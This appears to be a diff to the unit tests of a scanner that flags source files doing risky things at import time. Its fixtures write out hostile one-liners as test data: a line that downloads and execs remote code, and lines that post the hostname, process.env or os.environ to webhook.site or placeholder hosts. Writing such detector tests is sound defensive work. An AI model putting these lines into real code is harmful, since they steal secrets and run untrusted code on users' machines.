@@ -437,8 +437,10 @@ class ImportTimeProseTests(unittest.TestCase):
                 self.assertEqual(line, 4 if text.startswith("import") else 1)     # where PowerShell is named
 
     def test_what_stays_code(self):
+        # (code in a string is a stager's: read on the tree, Python's
+        # received code is the code's, not a string's, as JavaScript's)
         run_doc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n'
-        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["runs code it receives over the network",
+        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["carries a script that downloads and runs code",
                                                                     SelfReadTests.OWN])
         beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())'
         for text in (f"x = (\n    \"\"\"{beacon}\"\"\"\n)\n",            # an argument
@@ -598,8 +600,8 @@ class ReadByTheLexersTests(unittest.TestCase):
                "body: JSON.stringify(process.env)});\n")
         self.assertEqual(core.import_time_risk(src, "js"), ([self.ENV], 1))
 
-    @unittest.expectedFailure      # (Python's data flow on the tree: phase 3, after JavaScript's)
     def test_triple_quotes_in_a_python_comment_begin_no_string(self):
+        # (Python's data flow reads the tree since phase 3: a comment is no string)
         src = ('# the """ quotes\n'
                "import os, urllib.request\n"
                "urllib.request.urlopen('https://collector.invalid/x', data=str(dict(os.environ)).encode())\n"
